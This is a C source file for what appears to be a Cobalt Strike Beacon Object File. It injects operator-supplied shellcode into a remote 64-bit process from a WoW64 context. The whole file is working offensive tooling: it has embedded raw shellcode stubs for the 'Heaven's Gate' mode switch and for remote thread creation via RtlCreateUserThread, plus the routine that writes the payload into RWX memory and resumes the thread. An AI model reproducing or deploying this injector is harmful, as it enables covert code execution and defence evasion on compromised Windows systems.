/*
References:
- https://maldevacademy.com/new/modules/64
- https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm 
*/

#include <windows.h>
#include "beacon.h"

// Kernel32 Functions
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread(HANDLE);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);

NTSYSAPI NTSTATUS NTAPI NTDLL$NtQueryInformationProcess(HANDLE, ULONG, PVOID, ULONG, PULONG);

WINBASEAPI void * __cdecl MSVCRT$memset(void *, int, size_t);
WINBASEAPI void * __cdecl MSVCRT$memcpy(void *, const void *, size_t);

#define ProcessWow64Information 26

typedef struct _WOW64CONTEXT {
    union {
        HANDLE hProcess;
        BYTE   bPadding1[8];
    } h;

    union {
        LPVOID lpStartAddress;
        BYTE   bPadding2[8];
    } s;

    union {
        LPVOID lpParameter;
        BYTE   bPadding3[8];
    } p;

    union {
        HANDLE hThread;
        BYTE   bPadding4[8];
    } t;
} WOW64CONTEXT, * PWOW64CONTEXT;

typedef BOOL(WINAPI* FN_FUNCTION64)(
    _In_ ULONG Arg
    );

typedef ULONG(WINAPI* FN_EXECUTE64)(
    _In_ FN_FUNCTION64 Function64,
    _In_ PVOID         Arg
    );

// code stub that performs a context switch to 64-bit mode
// in the current Wow64 process to allow execution of x64
// code and revert back to Wow64 after finishing execution
static unsigned char bExecute64[] = {
    0x55,0x89,0xE5,0x56,0x57,0x8B,0x75,0x08,0x8B,0x4D,0x0C,0xE8,0x00,0x00,0x00,0x00,
    0x58,0x83,0xC0,0x2B,0x83,0xEC,0x08,0x89,0xE2,0xC7,0x42,0x04,0x33,0x00,0x00,0x00,
    0x89,0x02,0xE8,0x0F,0x00,0x00,0x00,0x66,0x8C,0xD8,0x66,0x8E,0xD0,0x83,0xC4,0x14,
    0x5F,0x5E,0x5D,0xC2,0x08,0x00,0x8B,0x3C,0xE4,0xFF,0x2A,0x48,0x31,0xC0,0x57,0xFF,
    0xD6,0x5F,0x50,0xC7,0x44,0x24,0x04,0x23,0x00,0x00,0x00,0x89,0x3C,0x24,0xFF,0x2C,
    0x24
};

// x64 code stub which is going to create a remote thread
// in the specified x64 process using RtlCreateUserThread
static unsigned char bFunction64[] = {
    0xFC,0x48,0x89,0xCE,0x48,0x89,0xE7,0x48,0x83,0xE4,0xF0,0xE8,0xC8,0x00,0x00,0x00,
    0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,
    0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A,
    0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9,
    0x0D,0x41,0x01,0xC1,0xE2,0xED,0x52,0x41,0x51,0x48,0x8B,0x52,0x20,0x8B,0x42,0x3C,
    0x48,0x01,0xD0,0x66,0x81,0x78,0x18,0x0B,0x02,0x75,0x72,0x8B,0x80,0x88,0x00,0x00,
    0x00,0x48,0x85,0xC0,0x74,0x67,0x48,0x01,0xD0,0x50,0x8B,0x48,0x18,0x44,0x8B,0x40,
    0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,0x01,0xD6,
    0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0x38,0xE0,
    0x75,0xF1,0x4C,0x03,0x4C,0x24,0x08,0x45,0x39,0xD1,0x75,0xD8,0x58,0x44,0x8B,0x40,
    0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,0xD0,
    0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41,0x58,0x41,0x58,0x5E,0x59,0x5A,0x41,0x58,
    0x41,0x59,0x41,0x5A,0x48,0x83,0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,0x59,0x5A,
    0x48,0x8B,0x12,0xE9,0x4F,0xFF,0xFF,0xFF,0x5D,0x4D,0x31,0xC9,0x41,0x51,0x48,0x8D,
    0x46,0x18,0x50,0xFF,0x76,0x10,0xFF,0x76,0x08,0x41,0x51,0x41,0x51,0x49,0xB8,0x01,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x31,0xD2,0x48,0x8B,0x0E,0x41,0xBA,0xC8,
    0x38,0xA4,0x40,0xFF,0xD5,0x48,0x85,0xC0,0x74,0x0C,0x48,0xB8,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0xEB,0x0A,0x48,0xB8,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x48,0x83,0xC4,0x50,0x48,0x89,0xFC,0xC3
};

BOOL IsProcessWow64(_In_ HANDLE ProcessHandle) {
    NTSTATUS Status = 0;
    PVOID pIsWow64 = NULL;

    if (!ProcessHandle) {
        return FALSE;
    }

    if ((Status = NTDLL$NtQueryInformationProcess(ProcessHandle, ProcessWow64Information, &pIsWow64, sizeof(PVOID), NULL)) != 0x00) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NtQueryInformationProcess Failed With Error: 0x%0.8X", Status);
        return FALSE;
    }

    return pIsWow64 ? TRUE : FALSE;
}

BOOL Wow64Inject(_In_ ULONG ProcessId, _In_ PVOID ShellcodeBuf, _In_ ULONG ShellcodeLen) {
    HANDLE        ProcessHandle = NULL;
    PVOID         VirtualMemory = NULL;
    PVOID         ExecMem64     = NULL;
    PVOID         ExecMem32     = NULL;
    FN_EXECUTE64  FnExecute64   = NULL;
    FN_FUNCTION64 FnFunction64  = NULL;
    WOW64CONTEXT  Wow64Ctx      = {0};
    SIZE_T        Written       = 0;
    BOOL          Success       = FALSE;

    ProcessHandle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
    if (!ProcessHandle) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess Failed with Error: %ld", KERNEL32$GetLastError());
        goto LEAVE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Opened process handle to %ld: 0x%p", ProcessId, ProcessHandle);

    if (IsProcessWow64(ProcessHandle)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Remote process %ld is a Wow64 process", ProcessId);
        goto LEAVE;
    }

    ExecMem32 = KERNEL32$VirtualAlloc(NULL, sizeof(bExecute64), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!ExecMem32) {
        BeaconPrintf(CALLBACK_ERROR, "[-] VirtualAlloc failed for bExecute64: %ld", KERNEL32$GetLastError());
        return FALSE;
    }

    MSVCRT$memcpy(ExecMem32, bExecute64, sizeof(bExecute64));

    ExecMem64 = KERNEL32$VirtualAlloc(NULL, sizeof(bFunction64), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!ExecMem64) {
        BeaconPrintf(CALLBACK_ERROR, "[-] VirtualAlloc failed for bFunction64: %ld", KERNEL32$GetLastError());
        KERNEL32$VirtualFree(ExecMem32, 0, MEM_RELEASE);
        return FALSE;
    }

    MSVCRT$memcpy(ExecMem64, bFunction64, sizeof(bFunction64));

    FnExecute64  = (FN_EXECUTE64)ExecMem32;
    FnFunction64 = (FN_FUNCTION64)ExecMem64;
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Process %ld (0x%p) is 64-bit", ProcessId, ProcessHandle);

    VirtualMemory = KERNEL32$VirtualAllocEx(ProcessHandle, NULL, ShellcodeLen, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!VirtualMemory) {
        BeaconPrintf(CALLBACK_ERROR, "[-] VirtualAllocEx Failed with Error: %ld", KERNEL32$GetLastError());
        goto LEAVE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Allocated memory @ %p [%ld bytes]", VirtualMemory, ShellcodeLen);

    if (!KERNEL32$WriteProcessMemory(ProcessHandle, VirtualMemory, ShellcodeBuf, ShellcodeLen, &Written)){
        BeaconPrintf(CALLBACK_ERROR, "[-] WriteProcessMemory Failed with Error: %ld", KERNEL32$GetLastError());
        goto LEAVE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Written to memory @ %p [%ld bytes written]", VirtualMemory, Written);

    MSVCRT$memset(&Wow64Ctx, 0, sizeof(WOW64CONTEXT));
    Wow64Ctx.h.hProcess       = ProcessHandle;
    Wow64Ctx.s.lpStartAddress = VirtualMemory;
    Wow64Ctx.p.lpParameter    = NULL;
    Wow64Ctx.t.hThread        = NULL;

    // switch the processor to be 64-bit mode and execute
    if (!FnExecute64(FnFunction64, &Wow64Ctx)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to switch processor context and execute 64-bit stub");
        goto LEAVE;
    }

    if (!Wow64Ctx.t.hThread) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create remote thread under 64-bit mode");
        goto LEAVE;
    }

    // resume thread that has been created in a suspended state from FnFunction64
    if (KERNEL32$ResumeThread(Wow64Ctx.t.hThread) == (DWORD)-1) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ResumeThread Failed with Error: %ld", KERNEL32$GetLastError());
        goto LEAVE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully injected thread (0x%p)", Wow64Ctx.t.hThread);

    Success = TRUE;

LEAVE:
    if (Wow64Ctx.t.hThread) {
        KERNEL32$CloseHandle(Wow64Ctx.t.hThread);
    }
    if (ProcessHandle) {
        KERNEL32$CloseHandle(ProcessHandle);
        ProcessHandle = NULL;
    }
    if (ExecMem32) {
        KERNEL32$VirtualFree(ExecMem32, 0, MEM_RELEASE);
    }
    if (ExecMem64) {
        KERNEL32$VirtualFree(ExecMem64, 0, MEM_RELEASE);
    }

    return Success;
}

void go(char * args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    DWORD procID = BeaconDataInt(&parser);
    int shellcodeSize = 0;
    CHAR* shellcode = BeaconDataExtract(&parser, &shellcodeSize);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target PID: %d", procID);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Shellcode Size: %d bytes", shellcodeSize);

    if (!Wow64Inject(procID, shellcode, (ULONG)shellcodeSize)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to inject into %ld", procID);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Injection completed successfully");
}

